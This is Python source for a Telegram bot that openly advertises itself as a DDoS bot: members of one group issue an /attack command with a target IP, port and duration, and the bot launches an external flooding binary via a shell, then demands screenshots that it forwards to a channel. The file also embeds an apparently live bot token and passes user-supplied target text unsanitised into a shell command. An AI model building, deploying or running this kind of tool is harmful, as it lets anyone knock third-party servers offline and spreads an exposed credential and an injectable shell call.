import telebot
import datetime
import time
import subprocess
import threading

bot = telebot.TeleBot('7555897511:AAF1HgbyA8SRCdmOKKpg7er2kwjA_Et5GD8')

GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

ATTACK_LIMIT = 10

attack_lock = threading.Lock()  # Thread-safe lock

pending_feedback = {}

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀** ❌")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **𝐏𝐄𝐇𝐋𝐄 𝐏𝐈𝐂 𝐁𝐄𝐉𝐎!** 🔥")
        return

    # **Lock System** (Only 1 attack at a time)
    if not attack_lock.acquire(blocking=False):
        bot.reply_to(message, "⚠️ **𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐀𝐍 𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆!**")
        return

    bot.send_message(message.chat.id, f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n🎯 `{target} : {port}`\n⏳ {time_duration}s")

    try:
        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
    finally:
        attack_lock.release()  # Release lock after attack completes

    bot.send_message(message.chat.id, "✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐎𝐍𝐄! 𝐀𝐁 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄!** 🚀")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
        bot.send_message(CHANNEL_USERNAME, f"📸 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!**\n👤 `{user_id}`")
        bot.reply_to(message, "✅ **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆𝐀𝐎!** 🚀")
        del pending_feedback[user_id]
    else:
        bot.reply_to(message, "❌ **𝐘𝐞 𝐀𝐏𝐏𝐑𝐎𝐏𝐑𝐈𝐀𝐓𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!**")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟
    
🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**  
💥 𝐓𝐡𝐞 𝐖𝐎𝐑𝐋𝐃'𝐒 𝐁𝐄𝐒𝐓 **DDOS BOT** 🔥  

🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/ravi_ka_rola) 🚀🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)